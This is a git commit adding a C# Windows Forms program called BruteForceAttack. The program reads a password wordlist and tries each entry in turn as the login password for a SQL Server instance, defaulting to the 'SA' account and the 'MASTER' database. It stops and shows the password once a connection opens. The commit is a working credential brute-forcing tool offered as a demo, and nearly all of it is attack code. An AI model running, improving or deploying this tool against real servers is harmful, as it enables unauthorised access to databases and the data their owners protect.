fe537e99b5f9e688dd02be02d70bb0f63ecad4f6
Alperen Yıldız <alperenyildiz98@gmail.com>
2020-04-26 18:13:02 +0300

    Demo Version

---
+++ BruteForceAttack/Brute Force.Designer.cs
@@ -0,0 +1,181 @@
+﻿namespace BruteForceAttack
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.txtCount = new System.Windows.Forms.TextBox();
+            this.txtDBname = new System.Windows.Forms.TextBox();
+            this.txtUserName = new System.Windows.Forms.TextBox();
+            this.txtServerName = new System.Windows.Forms.TextBox();
+            this.lstPasswordList = new System.Windows.Forms.ListBox();
+            this.lblStatus = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(403, 45);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(192, 33);
+            this.button1.TabIndex = 21;
+            this.button1.Text = "Find Password";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // txtCount
+            // 
+            this.txtCount.Location = new System.Drawing.Point(436, 13);
+            this.txtCount.Name = "txtCount";
+            this.txtCount.Size = new System.Drawing.Size(141, 20);
+            this.txtCount.TabIndex = 20;
+            // 
+            // txtDBname
+            // 
+            this.txtDBname.Location = new System.Drawing.Point(161, 80);
+            this.txtDBname.Name = "txtDBname";
+            this.txtDBname.Size = new System.Drawing.Size(141, 20);
+            this.txtDBname.TabIndex = 19;
+            this.txtDBname.Text = "MASTER";
+            // 
+            // txtUserName
+            // 
+            this.txtUserName.Location = new System.Drawing.Point(161, 45);
+            this.txtUserName.Name = "txtUserName";
+            this.txtUserName.Size = new System.Drawing.Size(141, 20);
+            this.txtUserName.TabIndex = 18;
+            this.txtUserName.Text = "SA";
+            // 
+            // txtServerName
+            // 
+            this.txtServerName.Location = new System.Drawing.Point(161, 12);
+            this.txtServerName.Name = "txtServerName";
+            this.txtServerName.Size = new System.Drawing.Size(141, 20);
+            this.txtServerName.TabIndex = 17;
+            // 
+            // lstPasswordList
+            // 
+            this.lstPasswordList.FormattingEnabled = true;
+            this.lstPasswordList.Location = new System.Drawing.Point(16, 154);
+            this.lstPasswordList.Name = "lstPasswordList";
+            this.lstPasswordList.Size = new System.Drawing.Size(379, 446);
+            this.lstPasswordList.TabIndex = 16;
+            // 
+            // lblStatus
+            // 
+            this.lblStatus.AutoSize = true;
+            this.lblStatus.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.lblStatus.Location = new System.Drawing.Point(15, 114);
+            this.lblStatus.Name = "lblStatus";
+            this.lblStatus.Size = new System.Drawing.Size(28, 24);
+            this.lblStatus.TabIndex = 15;
+            this.lblStatus.Text = "...";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label4.Location = new System.Drawing.Point(15, 80);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(98, 24);
+            this.label4.TabIndex = 14;
+            this.label4.Text = "DB Name";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label3.Location = new System.Drawing.Point(359, 9);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(71, 24);
+            this.label3.TabIndex = 13;
+            this.label3.Text = "Count:";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label2.Location = new System.Drawing.Point(12, 45);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(120, 24);
+            this.label2.TabIndex = 12;
+            this.label2.Text = "User Name:";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
+            this.label1.Location = new System.Drawing.Point(12, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(138, 24);
+            this.label1.TabIndex = 11;
+            this.label1.Text = "Server Name:";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1033, 608);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.txtCount);
+            this.Controls.Add(this.txtDBname);
+            this.Controls.Add(this.txtUserName);
+            this.Controls.Add(this.txtServerName);
+            this.Controls.Add(this.lstPasswordList);
+            this.Controls.Add(this.lblStatus);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox txtCount;
+        private System.Windows.Forms.TextBox txtDBname;
+        private System.Windows.Forms.TextBox txtUserName;
+        private System.Windows.Forms.TextBox txtServerName;
+        private System.Windows.Forms.ListBox lstPasswordList;
+        private System.Windows.Forms.Label lblStatus;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label1;
+    }
+}
+
---
+++ BruteForceAttack/Brute Force.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Data;
+using System.Data.SqlClient;
+
+namespace BruteForceAttack
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            String cs;
+            string serverName = txtServerName.Text;
+            string dbName = txtDBname.Text;
+            string userName = txtUserName.Text;
+            string password;
+            int count = Convert.ToInt32(txtCount.Text);
+            System.IO.StreamReader sr = new System.IO.StreamReader("uniqpass_preview.txt");
+            int k = 0;
+            lstPasswordList.Items.Clear();
+            DateTime dtStart = DateTime.Now;
+            for (int i = 0; i < count; i++)
+            {
+                k++;
+                password = sr.ReadLine();
+                lblStatus.Text = password;
+                Update();
+                lstPasswordList.Items.Add(password);
+                if (k > 15)
+                {
+                    k = 0;
+                    lstPasswordList.Items.Clear();
+                }
+                cs = "DATA SOURCE=" + serverName + ";INITIAL CATALOG=" + dbName + ";UID=" + userName + ";Password=" + password + ";CONNECT TIMEOUT=1";
+                try
+                {
+                    SqlConnection conn = new SqlConnection(cs);
+                    conn.Open();
+                    if (conn.State == ConnectionState.Open)
+                    {
+                        DateTime dtEnd = DateTime.Now;
+                        TimeSpan ts = dtEnd - dtStart;
+                        lblStatus.Text = i+"th connection attempt successful!  Password:'" + password+"'  Duration:"+ts.ToString(@"hh\:mm\:ss");
+
+                        return;
+                    }
+                }
+                catch (Exception)
+                {
+                    
+                }
+                
+            }
+            
+
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
